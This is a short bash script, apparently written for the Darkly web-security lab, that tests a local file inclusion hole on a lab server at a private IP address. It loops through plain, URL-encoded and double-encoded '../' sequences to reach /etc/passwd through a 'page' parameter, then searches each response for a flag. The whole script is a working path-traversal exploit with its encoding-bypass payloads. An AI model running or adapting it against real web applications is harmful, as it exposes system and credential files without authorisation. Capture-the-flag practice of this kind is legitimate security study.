#!/bin/bash

TARGET="http://192.168.56.102/index.php?page="
FILE="etc/passwd"
MAX_DEPTH=10

PREFIXES=(
    "../"
    "..%2F"
    "..%252F"
    "%2e%2e/"
)

echo "=== Darkly Local LFI Tester (Educational Only) ==="

for prefix in "${PREFIXES[@]}"; do
    current=""
    for ((i=1; i<=MAX_DEPTH; i++)); do
        current="${current}${prefix}"
        payload="${current}${FILE}"

        url="${TARGET}${payload}"

        echo "🧪 Testing: $url"
		response=$(curl -s $url | grep 'flag')
		code=$(echo $?)
		if [ $code -eq 0 ]; then
		    echo "🔥 Flag found!"
			echo $response
		    break 2
		fi
    done
done
